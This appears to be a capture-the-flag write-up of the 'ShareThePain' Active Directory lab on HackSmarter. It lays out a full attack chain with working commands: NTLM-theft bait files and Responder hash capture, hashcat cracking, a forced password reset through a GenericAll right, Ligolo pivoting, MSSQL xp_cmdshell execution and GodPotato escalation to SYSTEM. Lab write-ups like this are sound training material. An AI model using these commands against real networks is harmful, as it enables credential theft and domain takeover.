---
title: "ShareThePain HackSmarter" 
date: 2026-3-23 23:00:00 0000+
tags: [WriteUp, ShareThePain, HS, Enumeration, Active Directory, NTLM Theft, Responder, GenericAll, Hash Cracking ,MSSQL, Pivot, Ligolo, Hash Cracking, Lateral Movement, Bloodhound, SMB, bloodyAD, Privilege Escalation, Windows]
categories: [WriteUps, HackSmarter]
image:
  path: /assets/images/ShareThePain_HS/image.png
---
# ShareThePain HackSmarter

`ShareThePain` is a medium level `active directory` machine on `HackSmarter` which focuses on a phishing scenario upon enumeration it is found that on a share write access is world writable which enables us to perform an NTLM theft attack on the domain which helps us to get credentials of a user in a domain, lateral movement can be done from this user since later has `genericAll` on over to another user, getting a shell as newly owned user reveals that `MSSQL` instance is running on domain to which this user is sysadmin to which then helps us to enable `xp_cmdshell` and get on the box as mssql service and since this is a service account and these contains dangerous permissions, exploiting `Impersonation` on this gets us to get SYSTEM shell on the box hence pwning this domain.

![image.png](/assets/images/ShareThePain_HS/image.png)

## Initial Enumeration

### Rustmap

As always we start off with the rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.1.238.19
```

![image.png](/assets/images/ShareThePain_HS/image%201.png)

![image.png](/assets/images/ShareThePain_HS/image%202.png)

Looking at the results we can see that it is an active directory box which having a domain as hack.smarter and the domain controller is DC01.

Adding this to our /etc/hosts file the domain `hack.smarter` and the FQDN as `DC01.HACK.SMARTER` 

### SMB Enumeration

Lets start with the SMB enumeration. Checking for the null authentication across the DC and also enumerating the shares.

```bash
nxc smb 10.1.238.19 -u '' -p '' --shares
```

![image.png](/assets/images/ShareThePain_HS/image%203.png)

We can see that there is `READ,WRITE` on the `Share` share, meaning there might be `NTLM Theft` vulnerbility present on the DC.

NTLM THEFT is just another phishing vulnerbility used to trick employees of a org to open a malicious file and capturing there authentication and then cracking it.

There is a tool `NTLM_THEFT.py` on github.

## Exploitaiton

### NTLM THEFT

Lets generate some malicious files.

```bash
python3 /opt/ntlm_theft/ntlm_theft.py -g all -s 10.200.41.245 -f PleaseDontOpen
```

![image.png](/assets/images/ShareThePain_HS/image%204.png)

Connecting to the `Share` share.

```bash
smbclient //10.1.238.19/Share -U ''%''
```

![image.png](/assets/images/ShareThePain_HS/image%205.png)

Starting Responder to capture responses.

```bash
Responder -I tun0
```

Uploading the malicious files.

![image.png](/assets/images/ShareThePain_HS/image%206.png)

Got! Hash for `bob.ross` on the domain.

![image.png](/assets/images/ShareThePain_HS/image%207.png)

Lets crack it using `Hashcat.`

```bash
hashcat -m 5600 bob.ross-hash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/ShareThePain_HS/image%208.png)

Lets verify the creds using netexec.

![image.png](/assets/images/ShareThePain_HS/image%209.png)

### Bloodhound

Lets gather some bloodhound data from the domain for further movement in the domain.

```bash
rusthound-ce --domain hack.smarter -i 10.1.238.19 -u 'bob.ross' -p '137Password123!@#' -z
```

![image.png](/assets/images/ShareThePain_HS/image%2010.png)

Bloodhound show that as bob we have genericAll on alice.

![image.png](/assets/images/ShareThePain_HS/image%2011.png)

Lets change the password for `alice` and own them.

### Bob.ross → Alice.wonderland

Using `bloodyAD` for lateral movement to `Alice`.

```bash
bloodyAD -d hack.smarter -i 10.1.238.19 -u 'bob.ross' -p '137Password123!@#' set password 'Alice.wonderland' 'aashwin10!'
```

![image.png](/assets/images/ShareThePain_HS/image%2012.png)

Alice is a part of `remote management users` this means we can winrm as her.

### Shell as Alice.

Using `evil-winrm` to get a shell as alice.

```bash
python3 /opt/winrmexec/evil_winrmexec.py -dc-ip 10.1.238.19 hack.smarter/alice.wonderland:'aashwin10!'@dc01.hack.smarter
```

![image.png](/assets/images/ShareThePain_HS/image%2013.png)

Claiming the `user.txt` flag from the user’s desktop.

![image.png](/assets/images/ShareThePain_HS/image%2014.png)

Enumerating inside the machine as alice, we found that there is MSSQL service running on the box.

### Pivoting to access MSSQL (LIGOLO)

![image.png](/assets/images/ShareThePain_HS/image%2015.png)

Using `Ligolo` to access the `internal subnet` of the machine.

Uploading the agent.exe to the target machine.

![image.png](/assets/images/ShareThePain_HS/image%2016.png)

Now to access the internal subnet using ligolo we have to add as special `CIDR notation` on our interface.

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

![image.png](/assets/images/ShareThePain_HS/image%2017.png)

Now we can start the tunnelling.

![image.png](/assets/images/ShareThePain_HS/image%2018.png)

Now lets check for the mssql access.

![image.png](/assets/images/ShareThePain_HS/image%2019.png)

### Shell as NT AUTHORITY\SYSTEM

Now lets login using `mssqlclient.py` 

```bash
mssqlclient.py hack.smarter/'alice.wonderland':'aashwin10!'@240.0.0.1 -windows-auth
```

![image.png](/assets/images/ShareThePain_HS/image%2020.png)

Since we are `sysadmin` lets enable `xp_cmdshell` to get code execution.

![image.png](/assets/images/ShareThePain_HS/image%2021.png)

And we have `SeImpersonatePrivilege` too.

Lets create a cradle to get a shell on the box as `mssql$sqlexpress` 

![image.png](/assets/images/ShareThePain_HS/image%2022.png)

Executing the cradle

![image.png](/assets/images/ShareThePain_HS/image%2023.png)

Got a hit on python3 server and a shell on the DC as `mssql$sqlexpress`

![image.png](/assets/images/ShareThePain_HS/image%2024.png)

Lets get root.txt using `Godpotato.exe`

```bash
.\gp.exe -cmd 'cmd.exe /c type c:\users\administrator\desktop\root.txt'
```

![image.png](/assets/images/ShareThePain_HS/image%2025.png)

Thanks for reading 🙂